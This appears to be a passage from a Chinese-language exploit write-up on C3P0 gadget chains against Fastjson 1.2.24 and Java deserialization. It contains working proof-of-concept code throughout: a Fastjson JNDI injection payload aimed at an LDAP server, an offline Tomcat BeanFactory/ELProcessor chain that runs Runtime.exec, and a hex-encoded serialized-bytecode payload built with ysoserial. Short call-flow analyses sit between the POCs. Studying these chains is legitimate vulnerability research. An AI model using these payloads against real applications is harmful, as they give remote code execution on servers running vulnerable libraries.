        1.2.24
POC:
    package C3P0;
    import com.alibaba.fastjson.JSON;
    class Fastjson{
        public static void main(String[] args) {
            String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"ldap://127.0.0.1:1099/Exec\", \"loginTimeout\":0}";
            try {
                JSON.parseObject(payload);
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
        }
    }
## 流程分析
前边的过程跟普通的Fastjson流程一样执行到：
    method.invoke(object, value);
接着通过`setJndiName()`，为jndiName属性赋值为`ldap://127.0.0.1:1099/Exec`
接着会调用到setLoginTimeout`这里
    public void setLoginTimeout(int seconds) throws SQLException
    { inner().setLoginTimeout( seconds ); }
跟进`inner()`
又调用了`dereference()`，继续跟进，首先获取了其那边设置的JndiName，接着创建了上下文环境，最后又看到了熟悉的lookup()函数
触发了JNDI注入  
# 不出网利用
## BeanFactory
**依赖**
        org.apache.tomcat.embed
        tomcat-embed-core
        8.0.28
        org.apache.tomcat.embed
        tomcat-embed-el
        8.0.28
在C3P0的调用过程中最后是通过`ObjectFactory of = (ObjectFactory)
fClass.newInstance();`命令进行的类实例加载实现远程代码执行，而下方还有一条：
    return of.getObjectInstance( ref, name, nameCtx, env );
若`fClassLocation`为null的话就是默认加载而不是远程加载，加载到对象之后会调用`getObjectInstance`这个方法，该方法在JNDI的高版本绕过中出现过，用法也是一样的最后会调用
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
POC：
    package C3P0;
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import org.apache.naming.ResourceRef;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.naming.StringRefAddr;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.logging.Logger;
    public class C3P01 {
        public static void main(String[] args) throws Exception{
            PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            PoolSource poolSource = new PoolSource();
            Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSourceField.setAccessible(true);
            connectionPoolDataSourceField.set(poolBackedDataSourceBase,poolSource);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(out);
            objOut.writeObject(poolBackedDataSourceBase);
            byte[] serialize= out.toByteArray();
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
        }
        private static class PoolSource implements ConnectionPoolDataSource, Referenceable {
            private String classFactory;
            private String classFactoryLocation;
            public PoolSource(){
                this.classFactory = "BeanFactory";
                this.classFactoryLocation = null;
            }
            public PoolSource(String classFactory, String classFactoryLocation){
                this.classFactory = classFactory;
                this.classFactoryLocation = classFactoryLocation;
            }
            @Override
            public Reference getReference() throws NamingException {
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
                ref.add(new StringRefAddr("forceString", "sentiment=eval"));
                ref.add(new StringRefAddr("sentiment", "Runtime.getRuntime().exec(\"calc\")"));
                return ref;
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
    }
## Hex字节码加载
可以根据本地环境依赖选择利用链
    java -jar ysoserial-0.0.5.jar CommonsCollections5 "calc" > 1.txt
将字节码文件转为16进制，传入payload中，即可进行恶意字节码加载
    {"e":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"f":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:16进制编码"}}
### 流程分析
根据payload可以看出是对`userOverridesAsString`的值进行控制导致的字节码执行，而`userOverridesAsString`的setter方法在`com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase`中，所以跟进一下`setUserOverridesAsString()`
调用了`fireVetoableChange()`  
跟进其中又调用了`fireVetoableChange()`，其他有参方法，之后调用到了`listeners[current].vetoableChange(event);`  
跟进`vetoableChange()`，首先获取传进去的键和值，接着通过键的name进行if判断，最后调用了`C3P0ImplUtils.parseUserOverridesAsString()`对传入的16进制数据进行处理  
根据HASH_HEADER对十六进制进行截取，`HASH_HEADER`的默认值是`HexAsciiSerializedMap`，也就是payload中`userOverridesAsString`值中的键部分，通过它将十六进制数据读取出来并转换成ascii码，调用`fromByteArray()`进行处理
其中调用了：
    Object out = deserializeFromByteArray( bytes );
跟进后最终调用`readObject()`进行反序列化处理
POC：
    package C3P0;
    import com.alibaba.fastjson.JSON;
    class C3P02{
        public static void main(String[] args) {
            String payload = "{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"},\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\"userOverridesAsString\":\"HexAsciiSerializedMapn\"}}";
            try {
                JSON.parseObject(payload);
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
        }
    }